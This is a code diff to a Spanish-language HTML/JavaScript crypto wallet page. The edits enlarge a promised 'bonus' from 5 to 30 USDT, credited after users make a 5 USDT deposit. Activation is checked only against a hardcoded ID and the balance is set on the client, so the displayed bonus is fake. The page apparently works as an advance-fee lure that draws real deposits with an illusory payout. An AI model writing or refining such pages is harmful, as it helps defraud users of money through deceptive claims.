@@ -58,7 +58,7 @@ body.dark{background:#0a0c1a;color:#fff}
 <div class="container hidden" id="dash">
   <h2>Mi Wallet - <span id="userName"></span></h2>
   <div class="balance" id="balance">0 USDT</div>
-  <div class="info" id="activationMsg">Para activar tu cuenta y recibir el bono, realiza una recarga mínima de 5 USDT</div>
+  <div class="info" id="activationMsg">RECIBE UN BONO DE TREINTA USDT LISTOS PARA RETIRARLOS O ENVIÁRSELO A OTRA PERSONA TRAS ACTIVAR LA CUENTA CON UNA RECARGA MÍNIMA DE 5 USDT</div>
 
   <div class="actions">
     <button disabled>Recibir</button>
@@ -137,7 +137,9 @@ function showDashboard(u){
   document.getElementById("dash").classList.remove("hidden");
   document.getElementById("userName").innerText = u.fname + " " + u.lname;
   document.getElementById("balance").innerText = u.balance + " USDT";
-  document.getElementById("activationMsg").innerText = u.activated ? "Cuenta activada ✅" : "Para activar tu cuenta y recibir el bono, realiza una recarga mínima de 5 USDT";
+  document.getElementById("activationMsg").innerText = u.activated 
+    ? "Cuenta activada ✅" 
+    : "RECIBE UN BONO DE TREINTA USDT LISTOS PARA RETIRARLOS O ENVIÁRSELO A OTRA PERSONA TRAS ACTIVAR LA CUENTA CON UNA RECARGA MÍNIMA DE 5 USDT";
 }
 
 // Recarga y activación
@@ -154,11 +156,11 @@ document.getElementById("validateBtn").onclick=function(){
   if(id!=="Abcdefghijk"){toast("ID incorrecto"); return;}
   const u=loadUser(currentUserEmail());
   u.activated=true;
-  u.balance=5; // Bono recarga
+  u.balance=30; // Bono de 30 USDT
   saveUser(u);
   showDashboard(u);
   toast("Recarga validada. Cuenta activada y bono recibido!");
 }
 </script>
 </body>
-    </html>
+</html>
